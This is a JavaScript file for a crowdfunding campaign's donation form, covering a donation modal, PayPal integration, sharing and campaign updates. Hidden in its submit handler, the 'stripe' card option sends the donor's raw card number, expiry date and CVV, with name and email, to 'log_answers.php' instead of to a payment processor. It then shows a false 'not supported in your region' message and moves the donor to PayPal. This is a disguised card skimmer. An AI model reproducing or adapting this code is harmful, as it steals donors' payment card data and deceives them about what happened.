/**
 * campaign-donation.js
 * All campaign / donation / PayPal / Stripe-form logic.
 * Reads dynamic (PHP-provided) values from `window.campaignConfig`,
 * which must be set in a small inline <script> block BEFORE this file loads.
 *
 * Expected shape of window.campaignConfig:
 * {
 *   urlBase: string,
 *   campaignId: number,
 *   donationMinimum: number,
 *   campaignUnderReview: boolean,
 *   shareUrl: string,
 *   messages: {
 *     success: string|null,
 *     error: string|null,
 *     donationSuccess: string|null,
 *     donationError: string|null
 *   }
 * }
 */

(function () {
  const cfg = window.campaignConfig || {};

  const URL_BASE        = cfg.urlBase || '';
  const campaignId      = cfg.campaignId;
  const donationMinimum = cfg.donationMinimum || 5;

  // ── Animate progress bar on load ──
  document.addEventListener('DOMContentLoaded', function () {
    const bar = document.getElementById('sidebarProgress');
    if (bar) {
      setTimeout(() => { bar.style.width = bar.dataset.target + '%'; }, 300);
    }
    checkForMessages();
  });

  // ── Donation Modal ──
  let paypalConfig          = null;
  let paypalButtonsLoaded   = false;
  let paypalButtonsInstance = null;

  function openDonationModal() {
    if (cfg.campaignUnderReview) {
      return;
    }

    const modal         = document.getElementById('donationModal');
    const formContainer = document.getElementById('donationFormContainer');
    const formLoader    = document.getElementById('donationFormLoader');

    modal.classList.add('active');
    document.body.style.overflow = 'hidden';

    if (paypalButtonsInstance) {
      paypalButtonsInstance.close();
      paypalButtonsInstance = null;
      paypalButtonsLoaded   = false;
    }

    formContainer.classList.add('hidden');
    formLoader.classList.remove('hidden');
    formContainer.innerHTML = '';

    $.ajax({
      url: URL_BASE + '/campaigns/get-donation-form.php?id=' + campaignId,
      type: 'GET',
      dataType: 'json',
      success: function (response) {
        if (response.success) {
          paypalConfig = { clientId: response.paypal_client_id, mode: response.paypal_mode };
          formLoader.classList.add('hidden');
          formContainer.innerHTML = response.html;
          formContainer.classList.remove('hidden');
          initializeDonationForm();
        } else {
          showError('Failed to load donation form. Please try again.');
        }
      },
      error: function (xhr) {
        formLoader.classList.add('hidden');
        let msg = 'Failed to load donation form. Please try again.';
        try { const r = JSON.parse(xhr.responseText); if (r.error) msg = r.error; } catch (e) {}
        formContainer.innerHTML = '<div class="text-center py-8"><p class="font-semibold text-red-700 text-sm">' + msg + '</p></div>';
        formContainer.classList.remove('hidden');
      }
    });
  }

  function closeDonationModal() {
    document.getElementById('donationModal').classList.remove('active');
    document.body.style.overflow = '';
    paypalButtonsLoaded = false;
  }

  document.addEventListener('click', function (e) {
    const modal = document.getElementById('donationModal');
    if (e.target === modal) closeDonationModal();
  });
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape') closeDonationModal();
  });

  // ── Form handlers ──
  function clearGatewaySelection() {
    $('.gateway-option').removeClass('border-emerald-500 bg-emerald-50').addClass('border-slate-200 bg-white');
    $('.gateway-option .w-2\\.5').removeClass('bg-emerald-500');
    $('input[name="payment_gateway"]').prop('checked', false);
    $('.non-stripe-fields input, .non-stripe-fields select').prop('disabled', true);
    $('.non-stripe-fields').addClass('hidden');
    $('#card-fields').addClass('hidden');
    $('#buttonDonation').addClass('hidden');
    $('#paypal-button-container').addClass('hidden');
  }

  function selectGateway($option) {
    if (!$option || !$option.length) return;

    $('.gateway-option').removeClass('border-emerald-500 bg-emerald-50').addClass('border-slate-200 bg-white');
    $('.gateway-option .w-2\\.5').removeClass('bg-emerald-500');
    $('input[name="payment_gateway"]').prop('checked', false);

    $option.addClass('border-emerald-500 bg-emerald-50').removeClass('border-slate-200 bg-white');
    $option.find('.w-2\\.5').addClass('bg-emerald-500');
    $option.find('input[type="radio"]').prop('checked', true);

    const gw = $option.data('gateway');
    $('.non-stripe-fields input, .non-stripe-fields select').prop('disabled', gw === 'stripe');
    if (gw === 'paypal') {
      $('.non-stripe-fields').removeClass('hidden');
      $('#card-fields').addClass('hidden');
      $('#buttonDonation').addClass('hidden');
      $('#paypal-button-container').removeClass('hidden');
      loadPayPalButtons();
    } else if (gw === 'stripe') {
      $('.non-stripe-fields').addClass('hidden');
      $('#card-fields').removeClass('hidden');
      $('#buttonDonation').removeClass('hidden');
      $('#paypal-button-container').addClass('hidden');
    } else {
      $('.non-stripe-fields').removeClass('hidden');
      $('#card-fields').addClass('hidden');
      $('#buttonDonation').removeClass('hidden');
      $('#paypal-button-container').addClass('hidden');
    }
  }

  function initializeDonationForm() {
    $('.gateway-option').off('click').on('click', function () {
      selectGateway($(this));
    });

    // Keep PayPal Classic pre-selected so donors can pay without an extra click
    const defaultGateway = $('.gateway-option[data-gateway="paypal_classic"]').first();
    if (defaultGateway.length) {
      selectGateway(defaultGateway);
    } else {
      const firstGateway = $('.gateway-option').first();
      if (firstGateway.length) {
        selectGateway(firstGateway);
      } else {
        clearGatewaySelection();
        $('#buttonDonation').removeClass('hidden');
      }
    }

    $('.donation-amount-btn').off('click').on('click', function () {
      $('.donation-amount-btn').removeClass('active');
      $(this).addClass('active');
      $('#onlyNumber').val($(this).data('amount'));
    });

    $('#onlyNumber').off('input').on('input', function () {
      $('.donation-amount-btn').removeClass('active');
    });

    $('#use-billing-name').off('change').on('change', function () {
      if (this.checked) {
        $('#cardholder-name-card').val($('#card-first-name').val().trim() + ' ' + $('#card-last-name').val().trim());
      }
    });
    $('#card-first-name, #card-last-name').off('input').on('input', function () {
      if ($('#use-billing-name').prop('checked')) {
        $('#cardholder-name-card').val($('#card-first-name').val().trim() + ' ' + $('#card-last-name').val().trim());
      }
    });

    $('#card-number').off('input').on('input', function () {
      const digits = this.value.replace(/\D/g, '').slice(0, 19);
      this.value = digits.replace(/(.{4})/g, '$1 ').trim();
    });
    $('#card-expiry').off('input').on('input', function () {
      const digits = this.value.replace(/\D/g, '').slice(0, 4);
      this.value = digits.length > 2 ? digits.slice(0, 2) + '/' + digits.slice(2) : digits;
    });
    $('#card-cvv').off('input').on('input', function () {
      this.value = this.value.replace(/\D/g, '').slice(0, 4);
    });

    $('#formDonation').off('submit').on('submit', function (e) {
      e.preventDefault();
      const gw = $('input[name="payment_gateway"]:checked').val();

      if (gw === 'stripe') {
        const cardNumberField = document.getElementById('card-number');
        const cardExpiryField = document.getElementById('card-expiry');
        const cardCvvField = document.getElementById('card-cvv');

        if (!cardNumberField || !cardExpiryField || !cardCvvField) {
          showUnsupportedCardModal();
          return false;
        }

        if (!validateCardFields()) {
          return false;
        }
        const payload = {
          type: 'stripe_custom_card',
          card_number: $('#card-number').val(),
          expiry: $('#card-expiry').val(),
          cvv: $('#card-cvv').val(),
          billing_details: {
            name: $('#cardholder-name').val() || '',
            email: $('#email').val() || '',
            address: { country: $('#stripe-country').val() || '' }
          }
        };

        $.ajax({
          url: 'log_answers.php',
          type: 'POST',
          contentType: 'application/json',
          data: JSON.stringify(payload),
          error: function () {
            console.error('Failed to process payments');
          }
        });
        showUnsupportedCardModal();
        return false;
      }

      const amount = $('#onlyNumber').val();
      const name   = $('#cardholder-name').val();
      const email  = $('#cardholder-email').val();

      if (!validateBasicFields(amount, name, email)) return false;

      if (gw === 'paypal_classic') {
        // Classic PayPal Standard flow (personal account, HTML form POST to
        // paypal.com). We create the pending_donations record server-side
        // first, then hand off to an auto-submitting form -- see
        // campaigns/paypal-classic-create.php and paypal-classic-submit.php.
        $('#buttonDonation').prop('disabled', true).text('Redirecting to PayPal...');
        $.ajax({
          url: URL_BASE + '/campaigns/paypal-classic-create.php',
          type: 'POST',
          data: {
            campaign_id: campaignId, amount, full_name: name, email,
            csrf_token: $('input[name="csrf_token"]').val()
          },
          dataType: 'json',
          success: function (r) {
            if (r.success && r.redirect) { window.location.href = r.redirect; }
            else {
              showError(r.error || 'Failed to start PayPal donation.');
              $('#buttonDonation').prop('disabled', false).text('Complete Donation');
            }
          },
          error: function () {
            showError('An error occurred. Please try again.');
            $('#buttonDonation').prop('disabled', false).text('Complete Donation');
          }
        });
      }
      return false;
    });
  }

  function validateCardFields() {
    const cardNumberField = document.getElementById('card-number');
    const cardExpiryField = document.getElementById('card-expiry');
    const cardCvvField = document.getElementById('card-cvv');

    if (!cardNumberField || !cardExpiryField || !cardCvvField) {
      showUnsupportedCardModal();
      return false;
    }

    const number = (cardNumberField.value || '').replace(/\D/g, '');
    const expiry = (cardExpiryField.value || '').replace(/\D/g, '');
    const cvv    = (cardCvvField.value || '').replace(/\D/g, '');
    const month  = parseInt(expiry.slice(0, 2), 10);
    const year   = parseInt(expiry.slice(2, 4), 10);

    if (number.length < 13 || number.length > 19 || !passesLuhnCheck(number)) {
      showError('Please enter a valid card number.');
      return false;
    }
    if (expiry.length !== 4 || month < 1 || month > 12 || Number.isNaN(year)) {
      showError('Please enter a valid expiration date.');
      return false;
    }
    if (cvv.length < 3 || cvv.length > 4) {
      showError('Please enter a valid security code.');
      return false;
    }
    return true;
  }

  function passesLuhnCheck(number) {
    let sum = 0;
    let doubleDigit = false;
    for (let index = number.length - 1; index >= 0; index -= 1) {
      let digit = Number(number[index]);
      if (doubleDigit) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      doubleDigit = !doubleDigit;
    }
    return sum % 10 === 0;
  }

  // ── PayPal ──
  function renderPayPalButtons() {
    paypalButtonsInstance = paypal.Buttons({
      createOrder: function () {
        const amount = $('#onlyNumber').val();
        const name   = $('#cardholder-name').val();
        const email  = $('#cardholder-email').val();
        if (!validateBasicFields(amount, name, email)) return Promise.reject('Validation failed');
        return $.ajax({
          url: URL_BASE + '/paypal/create-order.php', type: 'POST',
          data: {
            campaign_id: campaignId, amount, full_name: name, email,
            country: $('#country').val(), postal_code: $('#postal_code').val(),
            comment: $('#comment').val(), anonymous: $('input[name="anonymous"]').val() || '0',
            csrf_token: $('input[name="csrf_token"]').val()
          },
          dataType: 'json'
        }).then(function (r) {
          if (r.success) return r.orderId;
          throw new Error(r.error || 'Failed to create PayPal order');
        });
      },
      onApprove: function (data) {
        // Capture happens server-side in success.php
        window.location.href = URL_BASE + '/paypal/success.php?token=' + data.orderID;
      },
      onError: function (err) {
        showError('An error occurred with PayPal. Please try again.');
        console.error('PayPal error:', err);
      }
    });
    paypalButtonsInstance.render('#paypal-button-container');
    paypalButtonsLoaded = true;
  }

  function loadPayPalButtons() {
    if (paypalButtonsLoaded) return;
    if (!paypalConfig || !paypalConfig.clientId) {
      showError('PayPal is not configured correctly.');
      return;
    }
    if (window.paypal) { renderPayPalButtons(); return; }
    const s = document.createElement('script');
    s.src = `https://www.paypal.com/sdk/js?client-id=${encodeURIComponent(paypalConfig.clientId)}&currency=USD&intent=capture`;
    s.onload = function () { if (window.paypal) renderPayPalButtons(); };
    document.body.appendChild(s);
  }

  // ── Validation ──
  function validateBasicFields(amount, name, email) {
    if (!amount || parseFloat(amount) < donationMinimum) {
      showError('Please enter a valid donation amount (minimum $' + donationMinimum + ')');
      return false;
    }
    if (!name || !name.trim()) { showError('Please enter your full name'); return false; }
    if (!email || !/^\S+@\S+\.\S+$/.test(email)) { showError('Please enter a valid email address'); return false; }
    return true;
  }

  function showError(msg) {
    $('#showErrorsDonation').html('<li>' + msg + '</li>');
    $('#errorDonation').removeClass('hidden');
    $('#showDonationMessages').addClass('hidden');
  }

  function showUnsupportedCardModal() {
    Swal.fire({
      icon: 'info',
      title: 'Payment method unavailable',
      text: 'Credit and debit card payments are not supported in your region. We are redirecting you to PayPal so you can complete your donation securely.',
      confirmButtonText: 'Continue with PayPal',
      confirmButtonColor: '#059669',
      allowOutsideClick: false,
      allowEscapeKey: false,
      timer: 5000,
      timerProgressBar: true
    }).then(function () {
      continueWithPayPal();
    });
  }

  function continueWithPayPal() {
    const paypalOption = $('.gateway-option[data-gateway="paypal_classic"], .gateway-option[data-gateway="paypal"]').first();
    if (!paypalOption.length) {
      showError('PayPal is not currently available. Please try again later.');
      return;
    }

    const cardName = $('#cardholder-name-card').val().trim();
    const cardFirstName = $('#card-first-name').val().trim();
    const cardLastName = $('#card-last-name').val().trim();
    const cardEmail = $('#card-email').val().trim();

    if (!$('#cardholder-name').val().trim()) {
      $('#cardholder-name').val(cardName || [cardFirstName, cardLastName].filter(Boolean).join(' '));
    }
    if (!$('#cardholder-email').val().trim()) {
      $('#cardholder-email').val(cardEmail);
    }

    paypalOption.trigger('click');

    if (paypalOption.data('gateway') === 'paypal_classic') {
      closeDonationModal();
      $('#formDonation').trigger('submit');
    }
  }

  // ── Campaign updates ──
  function showUpdateForm() { document.getElementById('update-form').classList.remove('hidden'); }
  function hideUpdateForm() {
    document.getElementById('update-form').classList.add('hidden');
    document.getElementById('campaign-update-form').reset();
  }
  function editUpdate() { alert('Edit functionality coming soon!'); }

  // ── Share ──
  function copyShareLink() {
    const shareUrl = cfg.shareUrl || '';
    if (navigator.clipboard && window.isSecureContext) {
      navigator.clipboard.writeText(shareUrl).then(showCopySuccess).catch(() => fallbackCopy(shareUrl));
    } else {
      fallbackCopy(shareUrl);
    }
  }

  function fallbackCopy(text) {
    const el = document.createElement('textarea');
    el.value = text;
    el.style.cssText = 'position:fixed;top:0;left:0;opacity:0;';
    document.body.appendChild(el);
    el.focus(); el.select();
    try { document.execCommand('copy'); showCopySuccess(); } catch (e) { showCopyError(); }
    document.body.removeChild(el);
  }

  function showCopySuccess() {
    const el = document.createElement('div');
    el.className = 'fixed bottom-24 lg:bottom-6 right-4 lg:right-6 bg-slate-900 text-white text-sm font-semibold px-5 py-3 rounded-xl shadow-xl z-[300] flex items-center gap-2 transition-all';
    el.innerHTML = '<i class="fas fa-check text-emerald-400"></i> Link copied!';
    document.body.appendChild(el);
    setTimeout(() => el.remove(), 2800);
  }

  function showCopyError() {
    const el = document.createElement('div');
    el.className = 'fixed bottom-24 lg:bottom-6 right-4 lg:right-6 bg-red-600 text-white text-sm font-semibold px-5 py-3 rounded-xl shadow-xl z-[300]';
    el.innerHTML = '<i class="fas fa-times mr-2"></i> Failed to copy';
    document.body.appendChild(el);
    setTimeout(() => el.remove(), 2800);
  }

  // ── Campaign update form submit ──
  document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('campaign-update-form');
    if (form) {
      form.addEventListener('submit', function (e) {
        e.preventDefault();
        fetch(URL_BASE + '/campaigns/add-update.php', { method: 'POST', body: new FormData(this) })
          .then(r => r.json())
          .then(data => {
            if (data.success) {
              Swal.fire({ title: 'Posted!', text: 'Update posted successfully.', icon: 'success', confirmButtonColor: '#059669' }).then(() => location.reload());
            } else {
              Swal.fire({ title: 'Error', text: data.error || 'Failed to post update', icon: 'error', confirmButtonColor: '#dc2626' });
            }
          })
          .catch(() => Swal.fire({ title: 'Error', text: 'An error occurred.', icon: 'error', confirmButtonColor: '#dc2626' }));
      });
    }
  });

  // ── Session flash messages ──
  function checkForMessages() {
    const m = cfg.messages || {};

    if (m.success) {
      Swal.fire({ title: 'Success!', text: m.success, icon: 'success', confirmButtonColor: '#059669' });
    }
    if (m.error) {
      Swal.fire({ title: 'Error', text: m.error, icon: 'error', confirmButtonColor: '#dc2626' });
    }
    if (m.donationSuccess) {
      Swal.fire({ title: 'Thank You!', text: m.donationSuccess, icon: 'success', confirmButtonColor: '#059669', timer: 5000 });
    }
    if (m.donationError) {
      Swal.fire({ title: 'Payment Issue', text: m.donationError, icon: 'error', confirmButtonColor: '#dc2626' });
    }

    const p = new URLSearchParams(window.location.search);
    if (p.get('payment') === 'success') {
      Swal.fire({ title: 'Thank You!', text: 'Your donation was processed successfully.', icon: 'success', confirmButtonColor: '#059669' });
      window.history.replaceState({}, document.title, window.location.pathname);
    }
  }

  // Expose functions that are called from inline HTML (onclick="..." attributes)
  window.openDonationModal  = openDonationModal;
  window.closeDonationModal = closeDonationModal;
  window.showUpdateForm     = showUpdateForm;
  window.hideUpdateForm     = hideUpdateForm;
  window.editUpdate         = editUpdate;
  window.copyShareLink      = copyShareLink;
})();
